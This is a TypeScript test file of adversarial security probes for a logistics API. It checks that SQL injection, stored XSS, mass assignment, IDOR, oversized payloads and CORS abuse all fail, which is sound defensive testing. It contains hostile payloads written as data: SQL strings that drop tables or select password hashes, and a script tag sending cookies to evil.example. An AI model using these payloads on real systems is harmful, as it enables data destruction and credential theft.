/**
 * Adversarial probes against the running API.
 *
 * Each case is an attack that would work against a plausible implementation of
 * this system. They are here so the security claims in the audit are backed by
 * something executable rather than by inspection.
 */
import type { NestExpressApplication } from '@nestjs/platform-express';
import {
  api,
  auth,
  createCompany,
  createTestApp,
  createUser,
  login,
  prisma,
  resetDatabase,
  resetRateLimits,
  uniqueSuffix,
  type TestUser,
} from './harness';

describe('Security probes', () => {
  let app: NestExpressApplication;
  let owner: TestUser;
  let companyId: string;

  beforeAll(async () => {
    app = await createTestApp();
  });
  afterAll(async () => {
    await app.close();
    await prisma.$disconnect();
  });
  beforeEach(async () => {
    await resetDatabase();
    resetRateLimits(app);
    const company = await createCompany();
    companyId = company.id;
    owner = await login(app, company.owner);
  });

  describe('SQL injection', () => {
    const PAYLOADS = [
      "'; DROP TABLE trips; --",
      "' OR '1'='1",
      "1; DELETE FROM companies WHERE '1'='1",
      "\\'; SELECT pg_sleep(10); --",
      "%' UNION SELECT password_hash FROM users --",
    ];

    it.each(PAYLOADS)('survives %s in a search filter', async (payload) => {
      await api(app)
        .post('/api/v1/clients')
        .set(auth(owner.accessToken))
        .send({ name: 'Real Client' })
        .expect(201);

      const response = await api(app)
        .get('/api/v1/clients')
        .query({ search: payload })
        .set(auth(owner.accessToken))
        .expect(200);

      // Treated as a literal string to look for, never as SQL.
      expect(response.body.data).toEqual([]);
      expect(await prisma.client.count()).toBe(1);
      expect(await prisma.company.count()).toBeGreaterThan(0);
    });

    it.each(PAYLOADS)(
      'survives %s in a text field that is stored and read back',
      async (payload) => {
        const created = await api(app)
          .post('/api/v1/clients')
          .set(auth(owner.accessToken))
          .send({ name: payload })
          .expect(201);

        // Stored verbatim — parameterised, so it is data rather than code.
        const stored = await prisma.client.findUniqueOrThrow({
          where: { id: created.body.data.id },
        });
        expect(stored.name).toBe(payload);
        expect(await prisma.client.count()).toBe(1);
      },
    );

    it('an injection attempt in a sort parameter cannot reach the query', async () => {
      const response = await api(app)
        .get('/api/v1/drivers')
        .query({ sort: 'name; DROP TABLE drivers', order: 'asc' })
        .set(auth(owner.accessToken));

      // The sort field is allow-listed, so an unknown value silently falls back.
      expect(response.status).toBe(200);
      expect(
        await prisma.$queryRaw<Array<{ count: bigint }>>`SELECT count(*) FROM drivers`,
      ).toBeDefined();
    });

    it('rejects an out-of-range sort direction rather than interpolating it', async () => {
      await api(app)
        .get('/api/v1/drivers')
        .query({ order: 'asc; DROP TABLE drivers' })
        .set(auth(owner.accessToken))
        .expect(400);
    });
  });

  describe('stored XSS payloads round-trip as data', () => {
    it('a script tag in a name is stored and returned escaped-as-JSON, never executed', async () => {
      const payload = '<script>fetch("//evil.example/"+document.cookie)</script>';
      const created = await api(app)
        .post('/api/v1/clients')
        .set(auth(owner.accessToken))
        .send({ name: payload })
        .expect(201);

      const response = await api(app)
        .get(`/api/v1/clients/${created.body.data.id}`)
        .set(auth(owner.accessToken))
        .expect(200);

      expect(response.body.data.name).toBe(payload);
      // JSON, not HTML: the browser will never parse this as markup.
      expect(response.headers['content-type']).toMatch(/application\/json/);
      expect(response.headers['x-content-type-options']).toBeUndefined();
    });
  });

  describe('mass assignment', () => {
    it('cannot set an internal field through a create payload', async () => {
      const response = await api(app).post('/api/v1/expenses').set(auth(owner.accessToken)).send({
        category: 'FUEL',
        amount: '1000',
        expenseDate: new Date().toISOString(),
        isApproved: true, // approving your own expense
        createdById: 'somebody-else',
      });

      expect(response.status).toBe(400);
      expect(response.body.error.code).toBe('VALIDATION_FAILED');
      expect(await prisma.expense.count()).toBe(0);
    });

    it('cannot self-approve by smuggling isApproved into an update', async () => {
      const created = await api(app)
        .post('/api/v1/expenses')
        .set(auth(owner.accessToken))
        .send({ category: 'FUEL', amount: '1000', expenseDate: new Date().toISOString() })
        .expect(201);

      await api(app)
        .patch(`/api/v1/expenses/${created.body.data.id}`)
        .set(auth(owner.accessToken))
        .send({ isApproved: true })
        .expect(400);

      const stored = await prisma.expense.findUniqueOrThrow({
        where: { id: created.body.data.id },
      });
      expect(stored.isApproved).toBe(false);
    });

    it('cannot promote a user beyond the tenant roles', async () => {
      const target = await createUser(companyId, 'LOGIST');
      await api(app)
        .patch(`/api/v1/users/${target.id}`)
        .set(auth(owner.accessToken))
        .send({ role: 'SUPERADMIN' })
        .expect(400);

      const stored = await prisma.user.findUniqueOrThrow({ where: { id: target.id } });
      expect(stored.role).toBe('LOGIST');
    });
  });

  describe('IDOR by id guessing', () => {
    it('a well-formed but foreign UUID is a 404, not a 500 or a leak', async () => {
      const foreign = await createCompany();
      const foreignClient = await prisma.client.create({
        data: { companyId: foreign.id, name: 'Foreign Secret Client' },
      });

      const response = await api(app)
        .get(`/api/v1/clients/${foreignClient.id}`)
        .set(auth(owner.accessToken));

      expect(response.status).toBe(404);
      expect(JSON.stringify(response.body)).not.toContain('Foreign Secret Client');
    });

    it('a malformed id is a 400 rather than a database error', async () => {
      const response = await api(app)
        .get('/api/v1/clients/not-a-uuid')
        .set(auth(owner.accessToken));
      expect(response.status).toBe(400);
      expect(JSON.stringify(response.body)).not.toMatch(/prisma|postgres|invalid input syntax/i);
    });
  });

  describe('oversized payloads', () => {
    it('refuses a body beyond the configured JSON limit with a 413, not a 500', async () => {
      const response = await api(app)
        .post('/api/v1/clients')
        .set(auth(owner.accessToken))
        .send({ name: 'x', address: 'A'.repeat(5 * 1024 * 1024) });

      // This used to assert only `>= 400`, and body-parser's
      // PayloadTooLargeError reached the filter as an unmapped Error — so the
      // real answer was 500 INTERNAL_ERROR and the assertion happily passed.
      // A client cannot tell "you sent too much" from "the server is broken",
      // and the mobile queue retries the latter forever.
      expect(response.status).toBe(413);
      expect(response.body.error.code).toBe('PAYLOAD_TOO_LARGE');
      expect(await prisma.client.count()).toBe(0);
    });

    it('refuses an event batch beyond the documented maximum', async () => {
      const driverUser = await login(app, await createUser(companyId, 'DRIVER'));
      const response = await api(app)
        .post('/api/v1/events/batch')
        .set(auth(driverUser.accessToken))
        .send({
          events: Array.from({ length: 101 }, (_unused, i) => ({
            clientEventId: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`,
            tripId: '00000000-0000-4000-8000-000000000000',
            eventType: 'REST',
            eventTime: new Date().toISOString(),
          })),
        });
      expect(response.status).toBe(400);
    });

    it('refuses an absurdly long string field', async () => {
      await api(app)
        .post('/api/v1/clients')
        .set(auth(owner.accessToken))
        .send({ name: 'A'.repeat(1000) })
        .expect(400);
    });
  });

  describe('public tracking link', () => {
    it('an unguessable token is required and a wrong one leaks nothing', async () => {
      const response = await api(app).get('/api/v1/public/track/guessed-token');
      expect(response.status).toBe(404);
      expect(JSON.stringify(response.body)).not.toMatch(/trip|company|driver/i);
    });

    it('the issued token is long and random', async () => {
      const vehicle = await api(app)
        .post('/api/v1/vehicles')
        .set(auth(owner.accessToken))
        .send({ plateNumber: `01S${uniqueSuffix().slice(-5).toUpperCase()}` })
        .expect(201);
      const trip = await api(app)
        .post('/api/v1/trips')
        .set(auth(owner.accessToken))
        .send({ vehicleId: vehicle.body.data.id })
        .expect(201);

      const link = await api(app)
        .post(`/api/v1/trips/${trip.body.data.id}/share-link`)
        .set(auth(owner.accessToken))
        .send({})
        .expect(200);

      // 24 random bytes → 48 hex chars. Not enumerable.
      expect(link.body.data.token).toMatch(/^[0-9a-f]{48}$/);
    });

    it('the public view exposes no prices, driver phone or company internals', async () => {
      const vehicle = await api(app)
        .post('/api/v1/vehicles')
        .set(auth(owner.accessToken))
        .send({ plateNumber: `01P${uniqueSuffix().slice(-5).toUpperCase()}` })
        .expect(201);
      const driver = await api(app)
        .post('/api/v1/drivers')
        .set(auth(owner.accessToken))
        .send({ fullName: 'Private Driver Name', phone: '+998901112233' })
        .expect(201);
      const trip = await api(app)
        .post('/api/v1/trips')
        .set(auth(owner.accessToken))
        .send({
          vehicleId: vehicle.body.data.id,
          driverId: driver.body.data.id,
          agreedPrice: '990000000',
          cargoName: 'Paxta',
        })
        .expect(201);

      const link = await api(app)
        .post(`/api/v1/trips/${trip.body.data.id}/share-link`)
        .set(auth(owner.accessToken))
        .send({})
        .expect(200);

      const view = await api(app).get(`/api/v1/public/track/${link.body.data.token}`).expect(200);

      const body = JSON.stringify(view.body);
      expect(view.body.data.cargoName).toBe('Paxta'); // the client may see this
      expect(body).not.toContain('990000000'); // price
      expect(body).not.toContain('+998901112233'); // driver phone
      expect(body).not.toContain('Private Driver Name');
      expect(body).not.toContain(companyId);
    });
  });

  describe('CORS', () => {
    it('does not reflect an arbitrary origin', async () => {
      const response = await api(app)
        .get('/api/v1/health/live')
        .set('Origin', 'https://evil.example');
      expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.example');
    });
  });

  describe('error responses', () => {
    it('a validation error names the field but leaks no internals', async () => {
      const response = await api(app)
        .post('/api/v1/clients')
        .set(auth(owner.accessToken))
        .send({})
        .expect(400);

      const body = JSON.stringify(response.body);
      expect(response.body.error.code).toBe('VALIDATION_FAILED');
      expect(body).not.toMatch(/node_modules|\/home\/|at Object\.|postgresql:\/\//);
    });
  });
});
